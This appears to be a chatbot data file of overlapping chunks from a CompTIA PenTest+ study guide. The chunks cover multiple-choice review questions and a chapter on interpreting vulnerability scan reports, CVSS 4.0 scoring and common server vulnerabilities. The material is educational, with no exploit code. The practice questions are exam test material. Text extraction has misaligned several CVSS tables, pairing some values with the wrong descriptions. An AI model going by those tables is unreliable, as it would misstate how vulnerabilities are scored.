rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of the following is not an example of a vulnerability scanning tool? A. Qualys B. Snort C. Nessus D. OpenVAS 6. Which one of the following technologies, when used within an organization, is the least likely to interfere with vulnerability scanning results achieved by external penetration testers? A. Encryption B. Firewall C. Containerization D. Intrusion prevention system 7. Renee is configuring her vulnerability management solution to perform credentialed scans of servers on her network. What type of account should she provide to the scanner? A. Domain administrator B. Local administrator C. Root D. Read‐only 8. Jason is writing a report about a potential security vulnerability in a software product and wishes to use standardized product names to ensure that other security analysts understand the report. Which SCAP component can Jason turn to for assistance? A. CVSS B. CVE C. CPE D. OVAL 9. Ken is planning to conduct a vulnerability scan of an organization as part of a penetration test. He is conducting an unknown environment test. When would it be appropriate to conduct an internal scan of the network? A. During the planning stage of the test B. As soon as the contract is signed C. After receiving permission from an administrator D. After compromising an internal host 10. Which type of organization is the most likely to be impacted by a law requiring them to conduct vulnerability scans? A. University B. Hospital C. Government agency D. Doctor's office 11. Which one of the following categories of systems is most likely to be disrupted during a vulnerability scan? A. External web server B. Internal web server C. IoT device D. Firewall 12. What term describes an organization's willingness to tolerate risk in their computing environment? A. Risk landscape B. Risk appetite C. Risk level D. Risk adaptation 13. Which one of the following factors is least likely to impact vulnerability scanning schedules? A. Regulatory requirements B. Technical constraints C. Business constraints D. Staff availability 14. Adam is conducting a penetration test of an organization and is reviewing the source code of an application for vulnerabilities. What type of code testing is Adam conducting? A. Mutation testing B. Static code analysis C. Dynamic code analysis D. Fuzzing 15. Ryan is planning to conduct a vulnerability scan of a business‐critical system using dangerous plug‐ins. What would be the best approach for the initial scan? A. Run the scan against production systems to achieve the most realistic results possible. B. Run the scan during business hours. C. Run the scan in a test environment. D. Do not run the scan to avoid disrupting the business. 16. Which one of the following activities is not part of the vulnerability management life cycle? A. Detection B. Remediation C. Reporting D. Testing 17. What approach to vulnerability scanning incorporates information from agents running on the target servers? A. Continuous monitoring B. Ongoing scanning C. On‐demand scanning D. Alerting 18. Brian is seeking to determine the appropriate impact categorization for a federal information system as he
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to achieve the most realistic results possible. B. Run the scan during business hours. C. Run the scan in a test environment. D. Do not run the scan to avoid disrupting the business. 16. Which one of the following activities is not part of the vulnerability management life cycle? A. Detection B. Remediation C. Reporting D. Testing 17. What approach to vulnerability scanning incorporates information from agents running on the target servers? A. Continuous monitoring B. Ongoing scanning C. On‐demand scanning D. Alerting 18. Brian is seeking to determine the appropriate impact categorization for a federal information system as he plans the vulnerability scanning controls for that system. After consulting management, he discovers that the system contains information that, if disclosed improperly, would have a serious adverse impact on the organization. How should this system be categorized? A. Low impact B. Moderate impact C. High impact D. Severe impact 19. Jessica is reading reports from vulnerability scans run by different parts of her organization using different products. She is responsible for assigning remediation resources and is having difficulty prioritizing issues from different sources. What SCAP component can help Jessica with this task? A. CVSS B. CVE C. CPE D. XCCDF 20. Sarah is conducting a penetration test and discovers a critical vulnerability in an application. What should she do next? A. Report the vulnerability to the client's IT manager. B. Consult the SOW. C. Report the vulnerability to the developer. D. Exploit the vulnerability. Chapter 5 Analyzing Vulnerability Scans THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 3: Vulnerability Discovery and Analysis 3.2 Given a scenario, analyze output from reconnaissance, scanning, and enumeration phases. Validate scan, reconnaissance, and enumeration results False positives False negatives True positives Scan completeness Troubleshooting scan configurations Public exploit selection Use scripting to validate results Penetration testers spend a significant amount of time analyzing and interpreting the reports generated by vulnerability scanners, in search of vulnerabilities that may be exploited to gain a foothold on a target system. Although scanners are extremely effective at automating the manual work of vulnerability identification, the results that they generate require interpretation by a trained analyst. In this chapter, you will learn how penetration testers apply their knowledge and experience to the review of vulnerability scan reports. Real World Scenario Analyzing a Vulnerability Report Let's again return to the penetration test of MCDS, LLC that we've been building over the last two chapters. You've now conducted an Nmap scan to perform your initial reconnaissance and developed a vulnerability scanning plan based on those results. After developing that plan, you ran a scan of one of the MCDS web servers and should have found two potential vulnerabilities. These vulnerabilities, which are discussed later in this chapter, are as follows: Internal IP disclosure (see Figure 5.16 later in this chapter) CGI generic SQL injection As you read through this chapter, consider how you might exploit these vulnerabilities to attack the target system. We will return to this exercise in
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	building over the last two chapters. You've now conducted an Nmap scan to perform your initial reconnaissance and developed a vulnerability scanning plan based on those results. After developing that plan, you ran a scan of one of the MCDS web servers and should have found two potential vulnerabilities. These vulnerabilities, which are discussed later in this chapter, are as follows: Internal IP disclosure (see Figure 5.16 later in this chapter) CGI generic SQL injection As you read through this chapter, consider how you might exploit these vulnerabilities to attack the target system. We will return to this exercise in Lab Activity 5.3 to develop an exploitation plan. Reviewing and Interpreting Scan Reports Vulnerability scan reports provide analysts with a significant amount of information that assists with the interpretation of the report. In addition to the high‐level report examples shown in Chapter 4, “Vulnerability Scanning,” vulnerability scanners provide detailed information about each vulnerability that they identify. Figure 5.1 shows an example of a single vulnerability reported by the Nessus scanner. FIGURE 5.1 Nessus vulnerability scan report Let's take a look at this report, section by section, beginning in the top left and proceeding in a counterclockwise fashion. At the very top of the report, we see two critical details: the name of the vulnerability, which offers a descriptive title, and the overall severity of the vulnerability, expressed as a general category, such as low, medium, high, or critical. In this example report, the scanner is reporting that a server is running an outdated and insecure version of the SSL protocol. It is assigned to the high severity category. Next, the report provides a detailed description of the vulnerability. In this case, the report provides a detailed description of the flaws in the SSL protocol and explains that SSL is no longer considered acceptable for use. The next section of the report provides a solution to the vulnerability. When possible, the scanner offers detailed information about how system administrators, security professionals, network engineers, and/or application developers may correct the vulnerability. In this case, the reader is instructed to disable SSL 2.0 and 3.0 and replace their use with a secure version of the TLS protocol. In the section of the report titled See Also, the scanner provides references where administrators can find more details on the vulnerability described in the report. In this case, the scanner refers the reader to several blog posts, Nessus documentation pages, and Internet Engineering Task Force (IETF) documents that provide more details on the vulnerability. The Output section of the report shows the detailed information returned by the remote system when probed for the vulnerability. This information can be extremely valuable to an analyst because it often provides the verbatim output returned by a command. Analysts can use this to better understand why the scanner is reporting a vulnerability, identify the location of a vulnerability, and potentially identify false positive reports. In this case, the Output section shows the specific insecure ciphers being used. The Port/Hosts
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	blog posts, Nessus documentation pages, and Internet Engineering Task Force (IETF) documents that provide more details on the vulnerability. The Output section of the report shows the detailed information returned by the remote system when probed for the vulnerability. This information can be extremely valuable to an analyst because it often provides the verbatim output returned by a command. Analysts can use this to better understand why the scanner is reporting a vulnerability, identify the location of a vulnerability, and potentially identify false positive reports. In this case, the Output section shows the specific insecure ciphers being used. The Port/Hosts section provides details on the server(s) that contain the vulnerability as well as the specific services on that server that have the vulnerability. In this case, the server's IP address is obscured for privacy reasons, but we can see that the server is running insecure versions of SSL on both ports 443 and 4433. The Vulnerability Information section provides some miscellaneous information about the vulnerability. In this case, we see that the SSL vulnerability has appeared in news reports. The Risk Information section includes useful information for assessing the severity of the vulnerability. In this case, the scanner reports that the vulnerability has an overall risk factor of High (consistent with the tag next to the vulnerability title). It also provides details on how the vulnerability rates when using the Common Vulnerability Scoring System (CVSS). We'll discuss the details of CVSS scoring in the next section of this chapter. The final section of the vulnerability report provides details on the vulnerability scanner plug‐in that detected the issue. This vulnerability was reported by Nessus plug‐in ID 20007. Although this chapter focuses on interpreting the details of a Nessus vulnerability scan, the process is extremely similar for other vulnerability scanners. The format of the reports generated by different products may vary, but they generally contain the same information. For example, Figure 5.2 shows the output of a Qualys vulnerability scan, and Figure 5.3 shows the output of an OpenVAS vulnerability scan. FIGURE 5.2 Qualys vulnerability scan report FIGURE 5.3 OpenVAS vulnerability scan report Understanding CVSS The Common Vulnerability Scoring System (CVSS) is an industry standard for assessing the severity of security vulnerabilities. It provides a technique for scoring each vulnerability on a variety of measures. Cybersecurity analysts often use CVSS ratings to prioritize response actions. CVSS has gone through several major revisions. The current version of CVSS is CVSS 4.0. As of this writing, vulnerability scanners were not yet reporting results using this new scale, but they are expected to do so shortly. You should be familiar with CVSS 4.0 for the exam. Analysts scoring a new vulnerability begin by rating the vulnerability using a set of defined measures. CVSS includes four sets of metrics: Base metrics are designed to measure the severity of a vulnerability, while the other metric sets expand this information to also include risk information based on the operational context. Threat metrics include features of the vulnerability that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	The current version of CVSS is CVSS 4.0. As of this writing, vulnerability scanners were not yet reporting results using this new scale, but they are expected to do so shortly. You should be familiar with CVSS 4.0 for the exam. Analysts scoring a new vulnerability begin by rating the vulnerability using a set of defined measures. CVSS includes four sets of metrics: Base metrics are designed to measure the severity of a vulnerability, while the other metric sets expand this information to also include risk information based on the operational context. Threat metrics include features of the vulnerability that may change over time. Environmental metrics represent characteristics of a vulnerability that are specific to the organization's operating environment. Supplemental metrics provide additional insight into a vulnerability. Each measure is given both a descriptive rating and a numeric score. For the purposes of the exam, you should be familiar with the base metrics that combine to form the CVSS base score. These metrics are divided into two categories: exploitability metrics and impact metrics. Exploitability Metrics The five exploitability metrics are attack vector (AV), attack complexity (AC), attack requirements (AT), privileges required (PR), and user interaction (UI). These describe the ability of an attacker to exploit the vulnerability in question. Attack Vector Metric The attack vector (AV) metric describes how an attacker would exploit the vulnerability and is assigned according to the criteria shown in Table 5.1. TABLE 5.1 CVSS attack vector metric Value Physical (P) Description The attacker must physically touch the vulnerable device. Local (L) The attacker must have physical or logical access to the affected system. Adjacent (A) Network (N) The attacker must have access to the local network that the affected system is connected to. The attacker can exploit the vulnerability remotely over a network. Attack Complexity Metric The attack complexity (AC) metric describes the difficulty of exploiting the vulnerability and is assigned according to the criteria shown in Table 5.2. TABLE 5.2 CVSS attack complexity metric Value High (H) Description Exploiting the vulnerability requires “specialized” conditions that would be difficult to find. Low (L) Exploiting the vulnerability does not require any specialized conditions. Attack Requirements Metric The attack requirements (AT) metric describes the conditions necessary on the vulnerable system to conduct the attack. This metric is set according to the criteria shown in Table 5.3. TABLE 5.3 CVSS attack requirements metric Value Description None (N) The attack will likely succeed against any vulnerable system an attacker can reach. Present There must be specific conditions in place on the target system (P) for the attack to succeed. Privileges Required Metric The privileges required (PR) metric describes the type of account access that an attacker would need to exploit a vulnerability and is assigned according to the criteria in Table 5.4. TABLE 5.4 CVSS privileges required metric Value Description High (H) Attackers require administrative privileges to conduct the attack. Low (L) Attackers require basic user privileges to conduct the attack. None (N) Attackers do not need to authenticate
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attack will likely succeed against any vulnerable system an attacker can reach. Present There must be specific conditions in place on the target system (P) for the attack to succeed. Privileges Required Metric The privileges required (PR) metric describes the type of account access that an attacker would need to exploit a vulnerability and is assigned according to the criteria in Table 5.4. TABLE 5.4 CVSS privileges required metric Value Description High (H) Attackers require administrative privileges to conduct the attack. Low (L) Attackers require basic user privileges to conduct the attack. None (N) Attackers do not need to authenticate to exploit the vulnerability. User Interaction Metric The user interaction (UI) metric describes whether the attacker needs to involve another human in the attack. The user interaction metric is assigned according to the criteria in Table 5.5. TABLE 5.5 CVSS user interaction metric Value None (N) Description Successful exploitation does not require action by any user other than the attacker. Passive (P) The user must perform some action, but it will likely be perceived as innocuous. Active (A) The attacker must get an authorized user to take specific, conscious action to successfully carry out the attack. Impact Metrics The impact metrics assess the impact on both the vulnerable system and subsequent systems using confidentiality, integrity, and availability scores. These metrics are each assessed in two different ways: according to their impact on the system containing the vulnerability (vulnerable system) and according to their impact on other systems affected by the attack after the vulnerable system is compromised (subsequent system). Confidentiality Metrics The confidentiality metrics describe the type of information disclosure that might occur if an attacker successfully exploits the vulnerability. You assign two different confidentiality metrics: the confidentiality impact to the vulnerable system (VC) and the confidentiality impact to the subsequent system (SC). Both values are assigned according to the criteria in Table 5.6. TABLE 5.6 CVSS confidentiality metrics Value Description None (N) Low (L) There is no confidentiality impact. High (H) All information on the system is compromised. Access to some information is possible, but the attacker does not have control over what information is compromised. Integrity Metrics The integrity metrics describe the type of information alteration that might occur if an attacker successfully exploits the vulnerability. The integrity metric is assigned according to the criteria in Table 5.7. As with the confidentiality metrics, you assign two different integrity values: the integrity impact to the vulnerable system (VI) and the integrity metric to the subsequent system (SI). TABLE 5.7 CVSS integrity metrics Value Description None (N) Low (L) There is no integrity impact. High (H) The integrity of the system is totally compromised, and the attacker may change any information at will. Modification of some information is possible, but the attacker does not have control over what information is modified. Availability Metrics The availability metrics describe the type of disruption that might occur if an attacker successfully exploits the vulnerability. The availability metric is assigned according to the criteria
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	values: the integrity impact to the vulnerable system (VI) and the integrity metric to the subsequent system (SI). TABLE 5.7 CVSS integrity metrics Value Description None (N) Low (L) There is no integrity impact. High (H) The integrity of the system is totally compromised, and the attacker may change any information at will. Modification of some information is possible, but the attacker does not have control over what information is modified. Availability Metrics The availability metrics describe the type of disruption that might occur if an attacker successfully exploits the vulnerability. The availability metric is assigned according to the criteria in Table 5.8. As with the confidentiality and integrity metrics, you assign two different availability values: the availability impact to the vulnerable system (VA) and the availability metric to the subsequent system (SA). TABLE 5.8 CVSS availability metrics Value Description None (N) There is no availability impact. Low (L) The performance of the system is degraded. High (H) The system is completely shut down. Interpreting the CVSS Vector The CVSS vector uses a single‐line format to convey the ratings of a vulnerability on the metrics described in the preceding sections. For example, examine the following CVSS vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N This vector contains nine components. The first section, CVSS:4.0, simply informs the reader (human or system) that the vector was composed using CVSS version 4.0. The next 11 sections correspond to each of the CVSS metrics. In this case, the vulnerability received the following ratings: Attack Vector: Network Attack Complexity: Low Attack Requirements: None Privileges Required: None User Interaction: Passive Confidentiality Impact to the Vulnerable System: High Confidentiality Impact to the Subsequent System: High Integrity Impact to the Vulnerable System: Low Integrity Impact to the Subsequent System: Low Availability Impact to the Vulnerable System: None Availability Impact to the Subsequent System: None Summarizing CVSS Scores The CVSS vector provides good, detailed information on the nature of the risk posed by a vulnerability, but the complexity of the vector makes it difficult to use in prioritization exercises. For this reason, analysts can calculate the CVSS base score, which is a single number representing the overall risk posed by the vulnerability. Fortunately, you don't need to do the complex math of calculating a CVSS base score yourself. Instead, you may use the CVSS 4.0 Calculator available at https://www.first.org/cvss/calculator/4.0. Figure 5.4 shows the CVSS calculator used to compute the base score of 8.4 for the vulnerability string we described earlier. FIGURE 5.4 CVSS 4.0 Calculator Categorizing CVSS Base Scores Many vulnerability scanning systems further summarize CVSS results by using risk categories rather than numeric risk ratings. These are usually based on the CVSS Qualitative Severity Rating Scale, shown in Table 5.9. TABLE 5.9 CVSS Qualitative Severity Rating Scale CVSS score Rating 0.0 None 0.1–3.9 4.0–6.9 7.0–8.9 9.0–10.0 Low Medium High Critical The base score of 8.4 from the CVSS string discussed earlier places it into the High risk category. This matches the output of the calculator from Figure 5.4. Validating Scan Results Cybersecurity analysts interpreting
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	vulnerability string we described earlier. FIGURE 5.4 CVSS 4.0 Calculator Categorizing CVSS Base Scores Many vulnerability scanning systems further summarize CVSS results by using risk categories rather than numeric risk ratings. These are usually based on the CVSS Qualitative Severity Rating Scale, shown in Table 5.9. TABLE 5.9 CVSS Qualitative Severity Rating Scale CVSS score Rating 0.0 None 0.1–3.9 4.0–6.9 7.0–8.9 9.0–10.0 Low Medium High Critical The base score of 8.4 from the CVSS string discussed earlier places it into the High risk category. This matches the output of the calculator from Figure 5.4. Validating Scan Results Cybersecurity analysts interpreting reports often perform their own investigations to confirm the presence and severity of vulnerabilities. This adjudication may include the use of external data sources that supply additional information valuable to the analysis. Vulnerability Scanning Errors Vulnerability scanners are useful tools, but they aren't foolproof. Scanners do sometimes make mistakes for a variety of reasons. The scanner might not have sufficient access to the target system to confirm a vulnerability, or it might simply have an error in a plug‐in that generates an erroneous vulnerability report. When a scanner reports a vulnerability that exists, it is known as a true positive report. When the scanner reports a vulnerability that does not exist, this is known as a false positive error. Similarly, when a scanner does not report a vulnerability that does exist, this is known as a false negative error. Cybersecurity analysts should confirm each vulnerability reported by a scanner. In some cases, this may be as simple as verifying that a patch is missing or an operating system is outdated. In other cases, verifying a vulnerability requires a complex manual process that simulates an exploit. For example, verifying a SQL injection vulnerability may require actually attempting an attack against a web application and verifying the result in the back‐end database. When verifying a vulnerability, analysts should draw on their own expertise as well as the subject matter expertise of others throughout the organization. Database administrators, system engineers, network technicians, software developers, and other experts have domain knowledge that is essential to the evaluation of a potential false positive report. Scan Completeness Ensuring the completeness of a scan involves verifying that the vulnerability scanner has effectively assessed all intended targets and accurately identified vulnerabilities, completing the expected scope and depth of the analysis. This process is critical because the effectiveness of a vulnerability management program depends on the scanner's ability to uncover all relevant vulnerabilities that may exist within the environment being scanned. A complete scan requires that: All network segments, systems, and applications within the scope have been covered and that the scan configurations are appropriate for the technologies being assessed. The scan has been conducted with sufficient privileges to access and evaluate the systems fully, as restricted access might lead to incomplete results, such as missing out on vulnerabilities that require authenticated checks. Scans are scheduled at intervals that align with the organization's risk tolerance and the changing threat
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	a vulnerability management program depends on the scanner's ability to uncover all relevant vulnerabilities that may exist within the environment being scanned. A complete scan requires that: All network segments, systems, and applications within the scope have been covered and that the scan configurations are appropriate for the technologies being assessed. The scan has been conducted with sufficient privileges to access and evaluate the systems fully, as restricted access might lead to incomplete results, such as missing out on vulnerabilities that require authenticated checks. Scans are scheduled at intervals that align with the organization's risk tolerance and the changing threat landscape, thus maintaining an up‐ to‐date security posture. Achieving scan completeness helps organizations in identifying and mitigating vulnerabilities effectively, reducing their attack surface, and enhancing their overall security. Troubleshooting Scan Configurations When scans do not perform as expected, it might be due to a misconfiguration of the scan. Testers should be able to troubleshoot scan configurations, including issues ranging from network access restrictions to misconfigured scanner settings: Verify that the scanner has the correct credentials and permissions to access target systems; insufficient access rights can lead to incomplete scanning and the omission of vulnerabilities that require authenticated scans. Ensure the scanner's settings are correctly aligned with the target environment's specifications—this includes setting the appropriate scan depth and intensity to balance thoroughness with network and system performance. Determine whether network firewalls, intrusion detection systems, or other security controls are interfering with scans, falsely categorizing them as malicious activity; adjusting these controls or whitelisting scanner IP addresses can mitigate such issues. Ensure the scanner's vulnerability database is current and does not lack the signatures for newer vulnerabilities; regularly updating the scanner's database is crucial for effective vulnerability detection. When troubleshooting, it's also helpful to consult logs and reports from the scanner for errors or warnings that can guide adjustments. Addressing these common issues can significantly improve scan accuracy and effectiveness, aiding in the identification and remediation of security vulnerabilities. Documented Exceptions In some cases, an organization may decide not to remediate a vulnerability for one reason or another. For example, the organization may decide that business requirements dictate the use of an operating system that is no longer supported. Similarly, development managers may decide that the cost of remediating a vulnerability in a web application that is exposed only to the internal network outweighs the security benefit. Unless analysts take some action to record these exceptions, vulnerability scans will continue to report them each time a scan runs. It's good practice to document exceptions in the vulnerability management system so that the scanner knows to ignore them in future reports. This reduces the level of noise in scan reports and increases their usefulness to analysts. Be careful when deciding to allow an exception. As discussed in Chapter 4, many organizations are subject to compliance requirements for vulnerability scanning. Creating an exception may violate those compliance obligations or go against best practices for security. Understanding Informational Results Vulnerability scanners often supply very detailed
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to record these exceptions, vulnerability scans will continue to report them each time a scan runs. It's good practice to document exceptions in the vulnerability management system so that the scanner knows to ignore them in future reports. This reduces the level of noise in scan reports and increases their usefulness to analysts. Be careful when deciding to allow an exception. As discussed in Chapter 4, many organizations are subject to compliance requirements for vulnerability scanning. Creating an exception may violate those compliance obligations or go against best practices for security. Understanding Informational Results Vulnerability scanners often supply very detailed information when run using default configurations. Not everything reported by a vulnerability scanner actually represents a significant security issue. Nevertheless, scanners provide as much information as they can determine to show the types of information that an attacker might be able to gather when conducting a reconnaissance scan. This information also provides important reconnaissance for a penetration tester seeking to gather information about a potential target system. Figure 5.5 shows an example of a high‐level report generated from a vulnerability scan run against a web server. Note that about two‐thirds of the vulnerabilities in this report fit into the “Info” risk category. This indicates that the plug‐ins providing results are not even categorized according to the CVSS. Instead, they are simply informational results. In some cases, they are observations that the scanner made about the system, whereas in other cases they may refer to a lack of best practices in the system configuration. Most organizations do not go to the extent of addressing all informational results about a system because doing so can be difficult, if not impossible. A penetration tester encountering the scan report in Figure 5.5 should first turn their attention to the high‐severity SQL injection vulnerability that exists. That is a very serious vulnerability that may provide a direct path to compromising the system's underlying database. If that exploitation does not bear fruit, the seven medium‐severity vulnerabilities may offer potential access. The remaining informational vulnerabilities are useful for reconnaissance but may not provide a direct path to compromise. Many organizations will adopt a formal policy for handling these informational messages from a remediation perspective. For example, some organizations may decide that once a message appears in two or three consecutive scans, they will create a journal entry documenting the actions they took in response to the message or the reasons they chose not to take actions. This approach is particularly important for highly audited organizations that have stringent compliance requirements. Creating a formal record of the decision‐making process satisfies auditors that the organization conducted due diligence. FIGURE 5.5 Scan report showing vulnerabilities and best practices Reconciling Scan Results with Other Data Sources Vulnerability scans should never take place in a vacuum. Penetration testers interpreting these reports should also turn to other sources of security information as they perform their analyses. When available to a penetration tester, the following information sources may also contain valuable information: Logs from
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	or the reasons they chose not to take actions. This approach is particularly important for highly audited organizations that have stringent compliance requirements. Creating a formal record of the decision‐making process satisfies auditors that the organization conducted due diligence. FIGURE 5.5 Scan report showing vulnerabilities and best practices Reconciling Scan Results with Other Data Sources Vulnerability scans should never take place in a vacuum. Penetration testers interpreting these reports should also turn to other sources of security information as they perform their analyses. When available to a penetration tester, the following information sources may also contain valuable information: Logs from servers, applications, network devices, and other sources that might contain information about possible attempts to exploit detected vulnerabilities Security information and event management (SIEM) systems that correlate log entries from multiple sources and provide actionable intelligence Configuration management systems that provide information on the operating system and applications installed on a system Each of these information sources can prove invaluable when a penetration tester attempts to reconcile a scan report with the reality of the organization's computing environment. Public Exploit Selection After pinpointing potential vulnerabilities, testers must select corresponding public exploits to validate the findings. This step involves consulting public repositories to identify exploits relevant to the reported vulnerabilities, enabling a more targeted and efficient testing process. Using public exploits also aids in assessing the real‐world applicability of each vulnerability, enhancing the accuracy of the scan's risk assessment. It's a process that bridges the gap between theoretical vulnerability identification and practical exploitability, ensuring that the scan results lead to actionable security enhancements. Trend Analysis Trend analysis is also an important part of a vulnerability scanning program. Managers should watch for overall trends in vulnerabilities, including the number of new vulnerabilities arising over time, the age of existing vulnerabilities, and the time required to remediate vulnerabilities. Figure 5.6 shows an example of the trend analysis reports available in Nessus. FIGURE 5.6 Vulnerability trend analysis Source: Tenable Network Security, Inc. Validating Scan Results with Scripting Cybersecurity professionals often employ scripts to validate and automate the analysis of vulnerability scan results. This approach helps distinguish true positives from false positives. By scripting the validation process, analysts can streamline repetitive tasks, such as parsing scan data, correlating findings with known vulnerabilities, and automating the testing of potential exploits. Scripting can also extend to integrating scan results with other tools and systems. For example, scripts can automatically update an incident response platform with details of confirmed vulnerabilities or trigger automated remediation processes in configuration management systems. Here are some common uses of scripting in validating scan results: Automated validation: Scripts can automatically validate the scanner's findings by attempting to exploit the reported vulnerabilities in a controlled environment. This helps confirm the exploitability of vulnerabilities, which is crucial for prioritizing remediation efforts. Data correlation: Scripts can correlate scan results with data from other sources, such as patch management databases and configuration management systems, to determine if vulnerabilities are already addressed or if certain patches are missing.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	can automatically update an incident response platform with details of confirmed vulnerabilities or trigger automated remediation processes in configuration management systems. Here are some common uses of scripting in validating scan results: Automated validation: Scripts can automatically validate the scanner's findings by attempting to exploit the reported vulnerabilities in a controlled environment. This helps confirm the exploitability of vulnerabilities, which is crucial for prioritizing remediation efforts. Data correlation: Scripts can correlate scan results with data from other sources, such as patch management databases and configuration management systems, to determine if vulnerabilities are already addressed or if certain patches are missing. Notification and reporting: Automated scripts can generate notifications for security teams about critical vulnerabilities or update dashboards in real time, providing a live view of the security posture. By using scripting, penetration testers can create a more robust and efficient workflow that saves time and enhances the accuracy of vulnerability assessments. This method allows testers to focus on strategic analysis and complex investigations rather than getting bogged down in manual validation. You'll learn more about using scripting to automate penetration testing work in Chapter 12, “Scripting for Penetration Testing.” Common Vulnerabilities Each vulnerability scanning system contains plug‐ins able to detect thousands of possible vulnerabilities, ranging from major SQL injection flaws in web applications to more mundane information disclosure issues with network devices. Though it's impossible to discuss each of these vulnerabilities in a book of any length, penetration testers should be familiar with the most commonly detected vulnerabilities and some of the general categories that cover many vulnerability variants. Chapter 4 discussed the importance of regularly updating vulnerability scanners to make them effective against newly discovered threats. Although this is true, it is also important to note that even old vulnerabilities can present significant issues to the security of organizations. Server and Endpoint Vulnerabilities Computer systems are quite complex. Operating systems run on both servers and endpoints consisting of millions of lines of code, and the differing combinations of applications they run makes each system fairly unique. It's no surprise, therefore, that many of the vulnerabilities detected by scans exist on server and endpoint systems, and these vulnerabilities are often among the most complex to remediate. This makes them attractive targets for penetration testers. Missing Patches Applying security patches to systems should be one of the core practices of any information security program, but this routine task is often neglected due to a lack of resources for preventive maintenance. One of the most common alerts from a vulnerability scan is that one or more systems on the network are running an outdated version of an operating system or application and require security patch(es). Penetration testers may take advantage of these missing patches and exploit operating system weaknesses. Figure 5.7 shows an example of one of these scan results. The server located at 10.64.142.211 has a remote code execution vulnerability. Though the scan result is fairly brief, it does contain quite a bit of helpful information: The description tells us that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	due to a lack of resources for preventive maintenance. One of the most common alerts from a vulnerability scan is that one or more systems on the network are running an outdated version of an operating system or application and require security patch(es). Penetration testers may take advantage of these missing patches and exploit operating system weaknesses. Figure 5.7 shows an example of one of these scan results. The server located at 10.64.142.211 has a remote code execution vulnerability. Though the scan result is fairly brief, it does contain quite a bit of helpful information: The description tells us that this is a flaw in the Windows HTTP stack. The service information in the Output section of the report confirms that the server is running an HTTPS service on TCP port 443. We see in the header that this is a critical vulnerability, which is confirmed in the Risk Information section, where we see that it has a CVSS base score of 10. Fortunately, there is an easy way to fix this problem. The Solution section tells us that Microsoft has released patches for the affected operating systems, and the See Also section provides a direct link to the Microsoft security bulletin that describes the issue and solution in greater detail. Mobile Device Security The section “Server and Endpoint Vulnerabilities” refers to the vulnerabilities typically found on traditional servers and endpoints, but it's important to note that mobile devices have a host of security issues of their own and must be carefully managed and patched to remain secure. The administrators of mobile devices can use a mobile device management (MDM) solution to manage the configuration of those devices, automatically installing patches, requiring the use of encryption, and providing remote wiping functionality. MDM solutions may also restrict the applications that can be run on a mobile device to those that appear on an approved list. That said, mobile devices do not typically show up on vulnerability scans because they are not often sitting on the network when those scans run. Therefore, administrators should pay careful attention to the security of those devices, even when they do not show up as requiring attention after a vulnerability scan. FIGURE 5.7 Missing patch vulnerability Unsupported Operating Systems and Applications Software vendors eventually discontinue support for every product they make. This is true for operating systems as well as applications. Once the vendor announces the final end of support for a product, organizations that continue running the outdated software put themselves at a significant risk of attack. The vendor will not investigate or correct security flaws that arise in the product after that date. Organizations continuing to run the unsupported product are on their own from a security perspective, and unless you happen to maintain a team of operating system developers, that's not a good situation to find yourself in. From a penetration tester's perspective, reports of unsupported software are a treasure trove of information. They're difficult for IT teams to remediate and offer a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	final end of support for a product, organizations that continue running the outdated software put themselves at a significant risk of attack. The vendor will not investigate or correct security flaws that arise in the product after that date. Organizations continuing to run the unsupported product are on their own from a security perspective, and unless you happen to maintain a team of operating system developers, that's not a good situation to find yourself in. From a penetration tester's perspective, reports of unsupported software are a treasure trove of information. They're difficult for IT teams to remediate and offer a potential avenue of exploitation. Perhaps the most famous end of support for a major operating system occurred in July 2015 when Microsoft discontinued support for the more‐ than‐a‐decade‐old Windows Server 2003. Figure 5.8 shows an example of the report generated by Nessus when it identifies a server running this outdated operating system. FIGURE 5.8 Unsupported operating system vulnerability We can see from this report that the scan detected two servers on the network running Windows Server 2003. The description of the vulnerability provides a stark assessment of what lies in store for organizations continuing to run any unsupported operating system: Lack of support implies that no new security patches for the product will be released by the vendor. As a result, it is likely to contain security vulnerabilities. Furthermore, Microsoft is unlikely to investigate or acknowledge reports of vulnerabilities. The solution for organizations running unsupported operating systems is simple in its phrasing but complex in implementation: “Upgrade to a version of Windows that is currently supported” is a pretty straightforward instruction, but it may pose a significant challenge for organizations running applications that can't be upgraded to newer versions of Windows. In cases where the organization must continue using an unsupported operating system, best practice dictates isolating the system as much as possible, preferably not connecting it to any network, and applying as many compensating security controls as possible, such as increased monitoring and implementation of strict network firewall rules. Buffer Overflows Buffer overflow attacks occur when an attacker manipulates a program into placing more data into an area of memory than is allocated for that program's use. The goal is to overwrite other information in memory with instructions that may be executed by a different process running on the system. Buffer overflow attacks are quite commonplace and tend to persist for many years after they are initially discovered. Cybersecurity analysts discovering a buffer overflow vulnerability during a vulnerability scan should seek out a patch that corrects the issue. In most cases, the scan report will directly identify an available patch. Privilege Escalation Privilege escalation attacks seek to increase the level of access that an attacker has to a target system. They exploit vulnerabilities that allow the transformation of a normal user account into a more privileged account, such as the root superuser account. In October 2016, security researchers announced the discovery of a Linux kernel vulnerability dubbed Dirty COW.
